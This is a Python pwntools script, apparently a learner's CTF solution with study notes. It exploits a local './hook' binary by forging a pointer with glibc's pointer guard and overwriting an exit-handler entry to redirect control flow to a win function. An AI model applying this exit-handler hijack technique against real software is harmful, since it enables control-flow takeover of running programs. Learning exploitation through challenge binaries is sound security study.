from pwn import * # library designed for exploit development and CTF challenges

p = process("./hook")
gdb.attach(p, "b exit")
#when i look at those 2 lines, im thinking: they are saying p is process in the hook in the current location. 
#and gdb is attached to the process, i mean to its exit? gdb is a debugger
"""
p = process("./hook") - uses pwntools to start the ./hook binary and store the handle in p so the script can talk to the target (send/recv).
it's kind of like a remote control to see what the program will do if i do certain actions.

gdb.attach(p, "b exit") — attaches GDB to that running process and immediately runs the gdb command b exit (set a breakpoint at the exit symbol). 
It’s attaching the debugger to the process, not to exit itself — the breakpoint just pauses execution when the program calls exit, 
so you can inspect memory/registers then.
ok got it kind sir (chatgpt) ^_^
"""

"""
def PTR_MANGLE(addr):
    return rotate_shift_left(xor(addr, pointer_guard), 0x11)

#XOR allows you to easily encrypt and decrypt a string, the other logic operations don't. See 'Cryptography' repo !!!!COMING SOON!!!!
#(xor(addr, pointer_guard) - mixes the address with the secret value (pointer_guard).
#rotate_shift_left (모모, 0x11) - rotates 모모 left by 0x11(17) bits. !!!Revise converting to binaries!!!
#mangle means severely mutilated
"""

def rorl(x, y):
    return ((x << y) | (x >> (64 - y))) & 0xFFFF_FFFF_FFFF_FFFF
#hm.. rotate... OR... what are those FFFFs...
"""
That function implements a 64-bit rotate-left of x by y bits and then forces the result back into 64 bits.
x << y -> shift x left by y bits (moves bits left, new low bits = 0).
| is bitwise OR — it merges those two parts together so you get the rotated result.
& 0xFFFF_FFFF_FFFF_FFFF masks off anything above 64 bits so the result fits in 64 bits.

!!!READ https://www.ibm.com/docs/en/aix/7.1.0?topic=constants-arithmetic!!!
!!!PWNTOOLS BASICS IN MY REPO!!!
!!!BASE64 (encoding algorithm) See 'Cryptography' repo!!!

"""

def mangle(addr):
    return rorl(addr ^ PTR_GUARD, 0x11)


p.recvuntil(b": 0x")
libc = int(p.recvline(keepends=False).decode(), 16) - 0x29CA8

p.recvuntil(b": 0x")
win_leak = int(p.recvline(keepends=False).decode(), 16)

p.recvuntil(b": 0x")
PTR_GUARD = int(p.recvline(keepends=False).decode(), 16)


initial = libc + 0x1E9000
payload = mangle(win_leak)

p.sendafter(b": ", p64(initial + 0x18))
p.sendafter(b": ", p64(payload))

p.interactive()
